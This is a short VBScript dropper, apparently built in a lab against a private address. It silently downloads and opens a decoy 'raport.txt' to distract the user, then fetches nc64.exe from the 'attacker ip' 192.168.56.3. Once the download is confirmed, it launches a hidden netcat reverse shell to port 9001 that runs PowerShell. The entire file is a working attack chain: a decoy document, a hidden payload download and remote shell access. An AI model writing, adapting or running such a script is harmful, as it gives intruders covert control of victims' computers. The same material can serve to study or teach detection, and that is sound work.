Set objShell = CreateObject("Wscript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Download fake raport
downloadRaport = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.3/raport.txt', '%TEMP%\raport.txt')"""
objShell.Run downloadRaport, 0, True
    WScript.Sleep 1000  ' Wait for 1 second

' Open raport.txt
openRaport = "cmd /c start """" %TEMP%\raport.txt"
objShell.Run openRaport, 0, True

' Download netcat from attacker ip
downloadCmd = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.3/nc64.exe', '%TEMP%\nc64.exe')"""
objShell.Run downloadCmd, 0, True
WScript.Sleep 2000 ' Wait for 2 seconds initially (adjust this if needed)

' Wait until the file has been downloaded
Do While Not objFSO.FileExists(objShell.ExpandEnvironmentStrings("%TEMP%\nc64.exe"))
    WScript.Sleep 1000  ' Wait for 1 second
Loop

' Start reverse shell
execCmd = "cmd /c powershell -WindowStyle Hidden -Command ""Start-Process \""%TEMP%\nc64.exe\"" -ArgumentList '192.168.56.3', '9001', '-e', 'powershell' -WindowStyle Hidden"""
objShell.Run execCmd, 0, True

Set objFSO = Nothing
Set objShell = Nothing